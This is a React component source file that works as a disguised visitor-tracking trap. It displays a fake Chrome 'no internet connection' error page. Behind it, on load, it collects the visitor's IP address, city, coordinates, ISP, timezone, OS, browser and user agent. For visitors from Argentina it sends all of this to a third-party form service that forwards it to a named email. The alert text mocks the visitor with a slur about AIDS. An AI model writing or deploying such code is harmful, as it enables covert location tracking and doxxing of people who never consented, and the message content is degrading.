import React, { useState, useEffect } from 'react';
import './App.css';

function App() {
  const [ipData, setIpData] = useState(null);
  const [locationData, setLocationData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // Use a ref to ensure the API calls only run exactly once per component lifecycle
  // This is especially useful in React StrictMode which triggers useEffect twice in dev.
  const hasFetched = React.useRef(false);


  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        // 1. Fetch IPv6 (will fallback to IPv4 if IPv6 is not available on the network)
        const ipRes = await fetch('https://api64.ipify.org?format=json');
        if (!ipRes.ok) throw new Error('Failed to fetch IP address');
        const ipJson = await ipRes.json();
        const ip = ipJson.ip;
        setIpData(ip);

        // 2. Fetch Location from ipinfo.io
        const locRes = await fetch(`https://ipinfo.io/${ip}/json`);
        if (!locRes.ok) {
          throw new Error('Failed to fetch location data');
        }
        const locJson = await locRes.json();
        setLocationData(locJson);

        // 3. Obtener datos del dispositivo usando User-Agent
        const ua = navigator.userAgent;
        let os = "Desconocido";
        if (ua.indexOf("Win") !== -1) os = "Windows";
        if (ua.indexOf("Android") !== -1) os = "Android";
        if (ua.indexOf("Mac") !== -1 && ua.indexOf("iPhone") === -1 && ua.indexOf("iPad") === -1) os = "macOS";
        if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
        if (ua.indexOf("Linux") !== -1 && ua.indexOf("Android") === -1) os = "Linux";

        let deviceType = "Computadora (PC/Mac)";
        if (/Mobi|Android/i.test(ua)) deviceType = "Teléfono / Tablet (Móvil)";

        let browser = "Desconocido";
        if (ua.indexOf("SamsungBrowser") !== -1) browser = "Samsung Internet";
        else if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) browser = "Opera";
        else if (ua.indexOf("Edg") !== -1) browser = "Edge";
        else if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
        else if (ua.indexOf("Safari") !== -1) browser = "Safari";
        else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";

        // 4. Send email to gonzaloheinen@hotmail.com with the data
        if (!hasFetched.current) {
          hasFetched.current = true;

          if (locJson.country === 'AR') {
            try {
              await fetch("https://formsubmit.co/ajax/dd244b70f5d86b7b3298dfab17b5aa7b", {
                method: "POST",
                headers: {
                  'Content-Type': 'application/json',
                  'Accept': 'application/json'
                },
                body: JSON.stringify({
                  _subject: "💀💀🐒🐒🍌🍌 ALERTA - ¡Nuevo BONOBO (con sida) en la página! 🍌🍌🐒🐒💀💀",
                  mensaje: "UN NUEVO BONOBO CON SIDA ACABA DE CAER EN TU SUPER TRAMPA MAGISTRAL (formidable). 🐒🐒🍌🍌 Aca estan sus datos:",
                  ip: ip,
                  city: locJson.city || 'Desconocido',
                  region: locJson.region || 'Desconocido',
                  country: locJson.country || 'Desconocido',
                  coordinates: locJson.loc || 'Desconocido',
                  isp_org: locJson.org || 'Desconocido',
                  timezone: locJson.timezone || 'Desconocido',
                  sistema_operativo: os,
                  navegador: browser,
                  tipo_de_dispositivo: deviceType,
                  user_agent_completo: ua,
                  hora_visitante: new Intl.DateTimeFormat('es-AR', { dateStyle: 'short', timeStyle: 'medium', timeZone: locJson.timezone || undefined }).format(new Date()),
                  hora_argentina: new Intl.DateTimeFormat('es-AR', { dateStyle: 'short', timeStyle: 'medium', timeZone: 'America/Argentina/Buenos_Aires' }).format(new Date())
                })
              });
            } catch (emailErr) {
              console.error("No se pudo enviar el correo:", emailErr);
            }
          }
        }
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };
    fetchData();
  }, []);

  return (
    <div className="chrome-error-page">
      <div className="interstitial-wrapper">
        <div id="main-content">

          <div id="main-message">
            <h1>No hay conexión a Internet</h1>
            <p>Comprueba los cables de red, el módem y el router.</p>
            <p>Vuelve a conectarte a una red Wi-Fi.</p>

            <div className="error-code">ERR_INTERNET_DISCONNECTED</div>
          </div>
        </div>

        <div className="button-container">
          <button className="primary-button" onClick={() => window.location.reload()}>
            Cargar de nuevo
          </button>
        </div>

        <div id="details-button">
          <button className="secondary-button">Detalles</button>
        </div>
      </div>
    </div>
  );
}

export default App;
